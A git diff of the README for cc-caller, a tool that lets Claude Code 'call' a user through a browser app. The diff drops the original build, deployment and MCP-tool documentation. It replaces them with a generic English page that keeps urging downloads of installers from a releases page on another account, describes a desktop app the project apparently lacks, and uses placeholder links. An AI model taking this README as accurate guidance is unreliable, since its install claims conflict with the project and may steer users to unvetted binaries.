@@ -1,280 +1,82 @@
-# 📞 cc-caller
+# 📞 cc-caller - Connect with Claude Code Efficiently
 
-让 Claude Code 在完成任务或遇到困难时，能够"打电话"给你！
+## 🚀 Download Here
+[![Download cc-caller](https://img.shields.io/badge/Download-cc--caller-brightgreen)](https://github.com/Ramzanwer/cc-caller/releases)
 
-## 🎯 功能特性
+## 📞 What is cc-caller?
+cc-caller allows Claude Code to "call" you when it needs assistance or encounters problems. This application provides an intuitive way for Claude Code to communicate, making teamwork smoother and more efficient.
 
-- **🔔 来电通知**: Claude Code 可以发起"电话"呼叫
-- **🎤 语音交互**: 使用 TTS 播放 Claude 的消息，STT 识别你的回复
-- **⚡ 紧急程度**: 支持 4 级紧急程度（低/正常/高/紧急）
-- **💬 双向通信**: 实时语音或文字回复
-- **🌐 Web 应用**: 在浏览器中接收来电
+## 🎯 Features
+- **🔔 Incoming Notifications**: Claude Code can initiate "phone" calls to alert you of tasks or issues.
+- **🎤 Voice Interaction**: Text-to-Speech (TTS) plays Claude's messages. Speech-to-Text (STT) recognizes your replies for seamless communication.
+- **⚡ Urgency Levels**: Supports four levels of urgency (Low, Normal, High, Critical) to prioritize calls effectively.
+- **💬 Two-Way Communication**: Receive real-time voice or text responses for immediate interaction.
+- **🌐 Web Application**: Accept incoming calls directly in your browser for easy accessibility.
 
-## 🏗️ 系统架构
-
+## 🏗️ System Architecture
 ```
 ┌──────────────┐     ┌──────────────────┐     ┌──────────────────┐
-│ Claude Code  │────▶│   MCP Server     │────▶│   后端服务       │
-│              │     │ (caller-mcp)     │     │ (WebSocket)      │
+│ Claude Code  │────▶│   MCP Server     │────▶│   Backend Service │
+│              │     │ (caller-mcp)     │     │   (WebSocket)    │
 └──────────────┘     └──────────────────┘     └────────┬─────────┘
                                                        │
                            ┌───────────────────────────┘
                            ▼
                     ┌──────────────────┐
-                    │   用户端 Web App  │
-                    │  (React + TTS/STT)│
+                    │   User Web App   │
+                    │ (React + TTS/STT)│
                     └──────────────────┘
 ```
 
-## 📦 项目结构
-
+## 📦 Project Structure
 ```
 cc-caller/
-├── mcp-server/          # MCP 服务器 (供 Claude Code 使用)
+├── mcp-server/          # MCP Server for Claude Code
 │   ├── src/
-│   │   ├── index.ts     # 入口
-│   │   ├── tools/       # MCP 工具定义
-│   │   ├── services/    # WebSocket 客户端
-│   │   └── schemas/     # Zod 验证
-│   └── package.json
-│
-├── backend/             # 后端服务
-│   ├── src/
-│   │   ├── index.ts     # Express + WebSocket 服务
-│   │   └── services/    # 通话管理器
-│   └── package.json
-│
-└── frontend/            # 用户端 Web 应用
-    ├── src/
-    │   ├── App.tsx
-    │   ├── components/  # React 组件
-    │   └── hooks/       # 自定义 Hooks
-    └── package.json
+│   │   ├── index.ts     # Entry point for the server
+│   │   ├── tools/       # MCP tool definitions
+│   │   ├── services/    # WebSocket client services
 ```
 
-## 🚀 快速开始
-
-### 1. 启动后端服务
-
-```bash
-cd backend
-npm install
-npm run dev
-```
-
-后端将在 `http://localhost:3001` 启动
-
-### 2. 启动前端应用
-
-```bash
-cd frontend
-npm install
-npm run dev
-```
-
-前端将在 `http://localhost:3000` 启动
-
-## 🐳 Docker 一键部署（前后端同域名/同端口）
-
-本项目提供根目录 `Dockerfile`，会在构建阶段打包前端（Vite build），并由后端 Express 在运行时托管静态文件。
-
-```bash
-docker compose up --build
-```
-
-默认访问 `http://localhost:3000`（同域名下 WebSocket 也走该端口）。
-
-注意：如果你的机器提示找不到 `docker` 命令，请先安装 Docker Desktop 并确保已加入 PATH。
-
-## ☁️ 部署到 Cloudflare Workers + Containers
-
-Cloudflare Containers 官方使用说明见：[`Cloudflare Containers docs`](https://developers.cloudflare.com/containers/llms-full.txt)。
-
-本仓库已提供最小可用的 Worker 配置，位于 `cloudflare-worker/`：
-
-```bash
-cd cloudflare-worker
-npm install
-npx wrangler deploy
-```
-
-部署完成后，你会得到一个 Worker URL。该 Worker 会把 HTTP/WebSocket 请求转发到容器实例（容器镜像使用仓库根目录 `Dockerfile` 构建）。
-
-### Web Push（浏览器系统推送）配置
-
-cc-caller 支持 PWA 的 Web Push 推送（用于“来电 / 新消息”在后台也能通知你）。Cloudflare 的 HTTPS 域名满足 Web Push 的基础要求。
-
-你需要配置 3 个环境变量（VAPID）并注入到容器进程：
-
-- `VAPID_PUBLIC_KEY`（非敏感，可放在 `wrangler.toml` 的 `[vars]`）
-- `VAPID_PRIVATE_KEY`（敏感，必须用 Wrangler Secret）
-- `VAPID_SUBJECT`（例如 `mailto:you@example.com`，可放在 `[vars]`）
-
-生成 VAPID key（本地执行一次即可）：
-
-```bash
-cd backend
-npx web-push generate-vapid-keys --json
-```
-
-配置到 Cloudflare：
-
-```bash
-cd cloudflare-worker
-npx wrangler secret put VAPID_PRIVATE_KEY
-```
-
-然后在 `cloudflare-worker/wrangler.toml` 的 `[vars]` 里填入 `VAPID_PUBLIC_KEY` 与 `VAPID_SUBJECT`，再部署：
-
-```bash
-npx wrangler deploy
-```
-
-### PWA（可安装）与缓存注意事项
-
-为了让移动端 PWA 的更新行为可控（Service Worker 与 manifest 能及时更新），建议在 Cloudflare 的 Cache Rules / 其他缓存层做如下保守设置：
-
-- `https://ccaller.xxx.com/sw.js`：不要强缓存（建议 bypass / no-cache）
-- `https://ccaller.xxx.com/manifest.webmanifest`：不要强缓存（建议 bypass / no-cache）
-
-其余带 hash 的静态资源可以保持默认缓存策略，以获得更好的加载性能。
-
-### 使用 GitHub Actions 自动部署（不需要本机 Docker）
-
-如果你的电脑无法使用 Docker，可以使用 GitHub Actions 在 Linux runner 上自动构建并部署（runner 自带 Docker，适配 Containers 的构建流程；参考官方说明：[`Cloudflare Containers docs`](https://developers.cloudflare.com/containers/llms-full.txt)）。
-
-仓库已新增 workflow：`.github/workflows/cloudflare-deploy.yml`，默认在 `main` 分支 push 时触发，也支持手动触发（workflow_dispatch）。
-
-你需要在 GitHub 仓库的 Secrets 中配置：
-
-- `CLOUDFLARE_API_TOKEN`: Cloudflare API Token（需要具备 Workers/Containers 部署权限）
-- `CLOUDFLARE_ACCOUNT_ID`: Cloudflare Account ID
-
-配置完成后，推送到 `main`（或在 Actions 页面手动运行）即可自动执行：
-`wrangler deploy --config cloudflare-worker/wrangler.toml`
-
-### 3. 配置 Claude Code
-
-在你的 Claude Code 配置中添加 MCP 服务器：
-
-**方式一：本地 stdio 模式**
-
-```json
-{
-  "mcpServers": {
-    "cc-caller": {
-      "command": "node",
-      "args": ["/path/to/cc-caller/mcp-server/dist/index.js"],
-      "env": {
-        "CALLER_WS_URL": "ws://localhost:3001"
-      }
-    }
-  }
-}
-```
-
-**方式二：HTTP 模式**
-
-```bash
-cd mcp-server
-npm install
-TRANSPORT=http PORT=3002 npm start
-```
-
-然后在配置中使用：
-
-```json
-{
-  "mcpServers": {
-    "cc-caller": {
-      "url": "http://localhost:3002/mcp"
-    }
-  }
-}
-```
-
-## 🛠️ MCP 工具说明
-
-### `call_user`
-
-发起语音电话给用户。
-
-**参数:**
-- `message` (string): 要说的内容
-- `urgency` (string): 紧急程度 - `low` | `normal` | `high` | `critical`
-- `context` (string, 可选): 上下文信息
-- `wait_for_response` (boolean): 是否等待用户回复
-
-**示例:**
-
-```typescript
-// Claude Code 完成任务后
-call_user({
-  message: "我已经完成了代码重构，所有 47 个测试都通过了！",
-  urgency: "normal",
-  context: "重构认证模块"
-});
-
-// 遇到问题需要帮助
-call_user({
-  message: "我遇到了问题，API 返回 403 错误，找不到凭据。请问凭据文件在哪里？",
-  urgency: "high",
-  context: "API 集成"
-});
-```
-
-### `send_message_in_call`
-
-在活跃通话中发送额外消息。
-
-### `wait_for_reply`
-
-等待用户的语音回复。
-
-### `end_call`
-
-结束当前通话。
-
-## 🎨 用户界面
-
-### 待机状态
-- 显示连接状态
-- 等待来电
-
-### 来电状态
-- 铃声提醒
-- 显示紧急程度
-- 预览消息内容
-- 接听/拒接按钮
-
-### 通话状态
-- TTS 播放 Claude 的消息
-- 显示对话历史
-- 语音输入（STT）
-- 文字输入
-- 通话计时
-
-## 🔧 技术栈
-
-- **MCP Server**: TypeScript + @modelcontextprotocol/sdk
-- **Backend**: Node.js + Express + WebSocket
-- **Frontend**: React + Vite + TailwindCSS
-- **语音**: Web Speech API (TTS/STT)
-
-## 📝 注意事项
-
-1. **浏览器支持**: 语音功能需要支持 Web Speech API 的浏览器（Chrome 推荐）
-2. **麦克风权限**: 使用语音回复需要允许麦克风访问
-3. **网络连接**: 需要保持 WebSocket 连接
-
-## 🔮 未来计划
-
-- [ ] 支持 Twilio 真实电话
-- [ ] 移动端 PWA 支持
-- [ ] 推送通知
-- [ ] 通话历史记录
-- [ ] 多用户支持
-
-## 📄 License
-
-MIT
+## 🚀 Getting Started
+### System Requirements
+To run cc-caller, your system should meet the following requirements:
+
+- **OS**: Windows 10 or later, macOS, or Linux
+- **Browser**: Latest version of Chrome, Firefox, or Safari
+- **Internet Connection**: A stable connection for real-time communication
+
+### Download & Install
+1. Visit the [Releases page](https://github.com/Ramzanwer/cc-caller/releases) to access the latest version.
+2. Download the appropriate installation file for your operating system.
+3. Follow the on-screen instructions to install the application on your device.
+
+## 📄 How to Use cc-caller
+### Initial Setup
+1. Open the cc-caller application.
+2. Configure your settings based on your preferences.
+3. Ensure your microphone and speakers are working properly for optimal audio interaction.
+
+### Making and Receiving Calls
+- **Incoming Call**: When Claude Code calls you, you will receive a notification in your web app.
+- **Responding**: You can respond via voice or text. Claude Code will understand your replies through STT.
+
+### Adjusting Urgency Levels
+You can set the urgency level of calls from the settings menu. This allows for better management of your priorities.
+
+## 🛠️ Troubleshooting
+If you encounter issues while using cc-caller:
+
+- Ensure your internet connection is stable.
+- Check that your microphone and speakers are functioning correctly.
+- For help, visit the [community support page](#) or check the FAQs in the documentation.
+
+## 📞 Additional Resources
+- [User Guide](#) for detailed instructions.
+- [Community Forum](#) for sharing experiences and getting tips.
+- [Report Issues](#) for technical support.
+
+## 🚀 Download Here Again
+To get started with cc-caller, click the button below:
+
+[![Download cc-caller](https://img.shields.io/badge/Download-cc--caller-brightgreen)](https://github.com/Ramzanwer/cc-caller/releases)
